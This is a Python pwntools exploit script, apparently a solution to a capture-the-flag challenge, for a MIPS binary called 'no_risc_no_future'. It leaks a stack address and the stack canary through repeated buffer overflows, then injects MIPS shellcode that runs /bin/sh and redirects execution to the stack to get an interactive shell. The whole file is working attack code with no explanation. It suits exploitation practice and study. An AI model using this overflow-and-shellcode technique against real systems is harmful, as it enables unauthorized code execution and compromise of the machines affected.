from pwn import *

context(arch="mips",endian="little")

elf = ELF("./no_risc_no_future")    

shellcode = b"\xff\xff\x10\x04\xab\x0f\x02\x24\x55\xf0\x46\x20\x66\x06\xff\x23\xc2\xf9\xec\x23\x66\x06\xbd\x23\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf\x9a\xf9\xbd\x23\x21\x20\x80\x01\x21\x28\xa0\x03\xcc\xcd\x44\x03/bin/sh\x00"

#p = gdb.debug(elf.path,'''
#        break main
#        break *0x40068c
#        break *0x400680
#        continue
#''')
p = process(elf.path)

canarry = None

buf = b'A' * 28
p.send(buf)
p.recvuntil('A' * 28)
stack_env_val_addr = u32(p.recv(4))
p.recvline()
log.info("stack_env_val_addr = " + hex(stack_env_val_addr))
stack_start_addr = stack_env_val_addr - 272
log.info("stack_start_addr = " + hex(stack_start_addr))

for i in range(10 - 2):
    buf = b'A' * 64
    buf += b'\x20'
    p.send(buf)
    p.recvuntil('A' * 64)
    data = p.recvline()[:-1]
    canarry = u32(data)
    print(hex(canarry))

canarry &= 0xffffff00
buf = shellcode
buf += b'A' * (64 - len(shellcode))
buf += p32(canarry)
buf += b'B' * 4
buf += p32(stack_start_addr)
p.send(buf)
print(p.recvline())
p.interactive()

